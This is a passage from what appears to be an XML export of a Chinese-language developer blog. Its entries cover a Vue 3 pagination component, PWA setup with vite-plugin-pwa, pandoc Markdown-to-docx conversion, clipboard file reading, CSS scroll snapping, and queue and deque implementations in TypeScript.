class="tag">&lt;<span class="name">button</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 30px&quot;</span>&gt;</span>共 &#123;&#123; total &#125;&#125; 条<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">import</span> &#123; computed, toRefs, type <span class="title class_">Ref</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> props = defineProps&lt;&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">pageNo</span>: number;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">pageSize</span>: number;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">total</span>: number;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">continues</span>: number;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;&gt;();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> &#123; pageNo, pageSize, total, continues &#125; = <span class="title function_">toRefs</span>(props);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">&quot;changePage&quot;</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> totalPage = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">ceil</span>(total.<span class="property">value</span> / pageSize.<span class="property">value</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">test</span> = (<span class="params"></span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(pageNo.<span class="property">value</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> startAndEnd = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">let</span> start = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(pageNo.<span class="property">value</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 如果总页数小于要显示的页数</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (totalPage.<span class="property">value</span> &lt; continues.<span class="property">value</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            start = <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end = totalPage.<span class="property">value</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125; <span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">// 正常情况</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            start = pageNo.<span class="property">value</span> - <span class="title class_">Math</span>.<span class="title function_">floor</span>(continues.<span class="property">value</span> / <span class="number">2</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end = pageNo.<span class="property">value</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(continues.<span class="property">value</span> / <span class="number">2</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 异常情况</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (start &lt; <span class="number">1</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            start = <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end = continues.<span class="property">value</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">if</span> (end &gt; totalPage.<span class="property">value</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            start = totalPage.<span class="property">value</span> - continues.<span class="property">value</span> + <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end = totalPage.<span class="property">value</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// debugger;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            start,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            end,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="attr">name</span>: <span class="string">&quot;pagination&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>使用分页器组件</h1>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">                  &lt;pagination</span><br><span class="line">                      v-<span class="keyword">if</span>=<span class="string">&quot;store.searchList&quot;</span></span><br><span class="line">                      :pageNo=<span class="string">&quot;searchParams.pageNo&quot;</span></span><br><span class="line">                      :pageSize=<span class="string">&quot;searchParams.pageSize&quot;</span></span><br><span class="line">                      :total=<span class="string">&quot;store.searchList.total&quot;</span></span><br><span class="line">                      :continues=<span class="string">&quot;5&quot;</span></span><br><span class="line">                      <span class="meta">@changePage</span>=<span class="string">&quot;changePage&quot;</span></span><br><span class="line">                  &gt;&lt;/pagination&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变页码并且发送请求</span></span><br><span class="line">  		<span class="keyword">const</span> <span class="title function_">changePage</span> = (<span class="params">pageNo: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(pageNo);</span><br><span class="line"></span><br><span class="line">        searchParams.<span class="property">value</span>.<span class="property">pageNo</span> = pageNo;</span><br><span class="line">        store.<span class="title function_">getSearchList</span>(searchParams.<span class="property">value</span>);</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>为 Vue 项目开启 PWA</title>
    <url>/20230220/%E4%B8%BA-Vue-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF-PWA/</url>
    <content><![CDATA[<img src="/20230220/%E4%B8%BA-Vue-%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF-PWA/pwa%E6%95%88%E6%9E%9C.png" class="" title="pwa效果">
<p>之前的网络上的教程都是 vue/cli 的, 经过我的一番摸索, 终于弄明白了 vite+vue3+pwa 的正确打开方式</p>
<ol>
<li class="lvl-3">
<p>安装 <code>​ vite-plugin-pwa</code></p>
<p><code>npm i vite-plugin-pwa -D</code></p>
</li>
<li class="lvl-3">
<p>配置 <code>vite-plugin-pwa</code></p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VitePWA</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vite-plugin-pwa&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [<span class="title class_">VitePWA</span>(&#123; <span class="attr">registerType</span>: <span class="string">&quot;autoUpdate&quot;</span> &#125;)],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1>使 PWA 可安装</h1>
<p>一开始配置好后, 浏览器并没有提示可以安装, 经过一晚上的摸索(看文档), 最终总结如下</p>
<p>使 PWA 可安装的前置要求: <a href="https://vite-pwa-org.netlify.app/guide/pwa-minimal-requirements.html">https://vite-pwa-org.netlify.app/guide/pwa-minimal-requirements.html</a></p>
<p>必须?同时满足以下条件</p>
<ul class="lvl-0">
<li class="lvl-4">
<p><code>index.html</code> 中的 <code>&lt;head&gt;</code> 标签中配置如下条目</p>
<ul class="lvl-2">
<li class="lvl-8"><code>viewport</code></li>
<li class="lvl-8"><code>title</code> 标签</li>
<li class="lvl-8"><code>description</code></li>
<li class="lvl-8"><code>favicon</code></li>
<li class="lvl-8"><code>apple-touch-icon</code></li>
<li class="lvl-8"><code>mask-icon</code></li>
<li class="lvl-8"><code>theme-color</code></li>
</ul>
</li>
<li class="lvl-4">
<p><code>Manifest</code> 清单文件中有如下配置</p>
<ul class="lvl-2">
<li class="lvl-8">a scope: omitted here for simplicity, the <code>vite-plugin-pwa</code> plugin will use the <code>Vite</code> base option to configure it (default is <code>/</code>)</li>
<li class="lvl-8">a name</li>
<li class="lvl-8">a short description</li>
<li class="lvl-8">a description</li>
<li class="lvl-8">a <code>theme_color</code>: <strong>must match</strong> the configured one on <code>Entry Point theme-color</code></li>
<li class="lvl-8">an icon with <code>192x192</code> size</li>
<li class="lvl-8">an icon with <code>512x512</code> size</li>
</ul>
</li>
<li class="lvl-4">
<p>也就是 <code>vite.config.js</code> 进行如下配置</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VitePWA</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vite-plugin-pwa&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="title class_">VitePWA</span>(&#123;</span><br><span class="line">            <span class="attr">includeAssets</span>: [</span><br><span class="line">                <span class="string">&quot;favicon.ico&quot;</span>,</span><br><span class="line">                <span class="string">&quot;apple-touch-icon.png&quot;</span>,</span><br><span class="line">                <span class="string">&quot;masked-icon.svg&quot;</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">manifest</span>: &#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&quot;My Awesome App&quot;</span>,</span><br><span class="line">                <span class="attr">short_name</span>: <span class="string">&quot;MyApp&quot;</span>,</span><br><span class="line">                <span class="attr">description</span>: <span class="string">&quot;My Awesome App description&quot;</span>,</span><br><span class="line">                <span class="attr">theme_color</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line">                <span class="attr">icons</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">src</span>: <span class="string">&quot;pwa-192x192.png&quot;</span>,</span><br><span class="line">                        <span class="attr">sizes</span>: <span class="string">&quot;192x192&quot;</span>,</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">src</span>: <span class="string">&quot;pwa-512x512.png&quot;</span>,</span><br><span class="line">                        <span class="attr">sizes</span>: <span class="string">&quot;512x512&quot;</span>,</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                ],</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;),</span><br><span class="line">    ],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-4">
<p>配置 <code>robots.txt</code></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>-<span class="attr">agent</span>: *</span><br><span class="line"><span class="title class_">Allow</span>: /</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-4">
<p>服务端满足以下要求 <a href="https://vite-pwa-org.netlify.app/deployment/">https://vite-pwa-org.netlify.app/deployment/</a></p>
<ul class="lvl-2">
<li class="lvl-8">serve <code>manifest.webmanifest</code> with <code>application/manifest+json</code> mime type</li>
<li class="lvl-8">必须使用 <code>https</code></li>
<li class="lvl-8"><code>http ​</code> 重定向 <code>https</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>pwa</tag>
      </tags>
  </entry>
  <entry>
    <title>利用pandoc合并markdown及转换为docx</title>
    <url>/20230120/%E5%88%A9%E7%94%A8pandoc%E5%90%88%E5%B9%B6markdown%E5%8F%8A%E8%BD%AC%E6%8D%A2%E4%B8%BAdocx/</url>
    <content><![CDATA[<p>最近有需求把 markdown 文档合并起来然后转换为 word 文档以供打印的需求, 所以了解到了 pandoc 这一款命令行文本处理神器</p>
<span id="more"></span>
<ul class="lvl-0">
<li class="lvl-4">
<p>批量合并 markdown<br>
小 tips: 如果需要大批量文件, 可以在资源管理器中全选, 然后拖到终端窗口中, 自动填充路径及文件名</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pandoc -s file1.md file2.md -o AllJavaScript.md</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-4">
<p>markdown 转 doc</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pandoc -o output.docx -f markdown -t docx .\AllInOne.md</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>pandoc</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript获取剪贴板文件</title>
    <url>/20230113/JavaScript%E8%8E%B7%E5%8F%96%E5%89%AA%E8%B4%B4%E6%9D%BF%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;paste&quot;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">clipboardData</span>.<span class="property">files</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>纯CSS实现全屏滚动效果</title>
    <url>/20230213/%E7%BA%AFCSS%E5%AE%9E%E7%8E%B0%E5%85%A8%E5%B1%8F%E6%BB%9A%E5%8A%A8%E6%95%88%E6%9E%9C/</url>
    <content><![CDATA[<p>实现全屏滚动可以不依赖 JS, 只使用纯 CSS 实现, 不过只有较新版本的浏览器支持这一特性</p>
<p>主要使用了以下 CSS 属性</p>
<ul class="lvl-0">
<li class="lvl-4">
<p><code>scroll-snap-type: y mandatory;</code> 给父元素设置, 设置贴合类型</p>
</li>
<li class="lvl-4">
<p><code>scroll-snap-align: start;</code> 给子元素设置, 设置贴合点</p>
</li>
</ul>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;main&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/main&gt;</span><br></pre></td></tr></table></figure>
<p>容器布局</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    <span class="selector-tag">main</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">        <span class="attribute">scroll-snap-type</span>: y mandatory;</span><br><span class="line">        <span class="attribute">overflow</span>: scroll;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">main</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">border</span>: black <span class="number">2px</span> solid;</span><br><span class="line">        <span class="attribute">scroll-snap-align</span>: start;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100vw</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>样式设置</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome 单独清除某个网页的缓存</title>
    <url>/20230216/Chrome-%E5%8D%95%E7%8B%AC%E6%B8%85%E9%99%A4%E6%9F%90%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<img src="/20230216/Chrome-%E5%8D%95%E7%8B%AC%E6%B8%85%E9%99%A4%E6%9F%90%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E7%BC%93%E5%AD%98/%E6%B8%85%E9%99%A4%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98.png" class="" title="清除网页缓存">
<ol>
<li class="lvl-3">打开该网页</li>
<li class="lvl-3">打开开发者工具</li>
<li class="lvl-3">长按刷新按钮</li>
<li class="lvl-3">选择 清空缓存并硬性重新加载</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习-队列</title>
    <url>/20230306/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1>队列是什么</h1>
<p>队列是一种特殊的线性表, 他只允许在表的前端进行删除操作, 在表的后端进行插入操作</p>
<p>只有最早进入队列的元素才能最先从队列中删除, 所以队列又称为 先进先出线性表 (FIFO)</p>
<h1>队列的实现</h1>
<h3 id="数组实现的队列">数组实现的队列</h3>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">arrQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="attr">queue</span>: <span class="built_in">unknown</span>[] = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列尾部插入元素</span></span><br><span class="line">    <span class="title function_">enqueue</span>(<span class="params">data: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">push</span>(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列头部删除元素</span></span><br><span class="line">    <span class="title function_">dequeue</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">shift</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回队列头部元素</span></span><br><span class="line">    <span class="title function_">front</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">at</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="property">length</span> === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queue = <span class="keyword">new</span> <span class="title function_">arrQueue</span>();</span><br></pre></td></tr></table></figure>
<p>数组实现的队列虽然简单, 但是由于 shift 操作消耗资源大, 所以这种队列性能不高</p>
<h3 id="对象实现的队列">对象实现的队列</h3>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">QueueObj</span> = &#123;</span><br><span class="line">    [<span class="attr">k</span>: <span class="built_in">number</span>]: <span class="built_in">any</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 使用对象实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">objectQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="attr">queue</span>: <span class="title class_">QueueObj</span> = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 开始的下标</span></span><br><span class="line">    <span class="keyword">private</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 结束的下标</span></span><br><span class="line">    <span class="keyword">private</span> end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列尾部插入元素</span></span><br><span class="line">    <span class="title function_">enqueue</span>(<span class="params">data: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span>] = data;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">end</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span> - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列头部删除元素</span></span><br><span class="line">    <span class="title function_">dequeue</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> item = <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">start</span>++;</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回队列头部元素</span></span><br><span class="line">    <span class="title function_">front</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">size</span>() === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">end</span> - <span class="variable language_">this</span>.<span class="property">start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span> = &#123;&#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">start</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">end</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">start</span>; index &lt; <span class="variable language_">this</span>.<span class="property">end</span>; index++) &#123;</span><br><span class="line">            str += <span class="variable language_">this</span>.<span class="property">queue</span>[index] + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双端队列">双端队列</h2>
<p>双端队列（Double-ended queue，简称 deque）是一种具有队列和栈的性质的数据结构，它允许从两端添加和删除元素。</p>
<p>实现:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">DoubleQueue</span> = &#123;</span><br><span class="line">    [<span class="attr">k</span>: <span class="built_in">number</span>]: <span class="built_in">any</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 使用对象实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">doubleQueue</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="attr">queue</span>: <span class="title class_">DoubleQueue</span> = &#123;&#125;;</span><br><span class="line">    <span class="comment">// 开始的下标</span></span><br><span class="line">    <span class="keyword">private</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 结束的下标</span></span><br><span class="line">    <span class="keyword">private</span> end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列头部添加元素</span></span><br><span class="line">    <span class="title function_">addFront</span>(<span class="params">data: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">start</span>--;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>] = data;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从队列尾部插入元素</span></span><br><span class="line">    <span class="title function_">addBack</span>(<span class="params">data: <span class="built_in">unknown</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span>] = data;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">end</span>++;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span> - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从队列头部删除元素</span></span><br><span class="line">    <span class="title function_">delFront</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">start</span>++;</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">        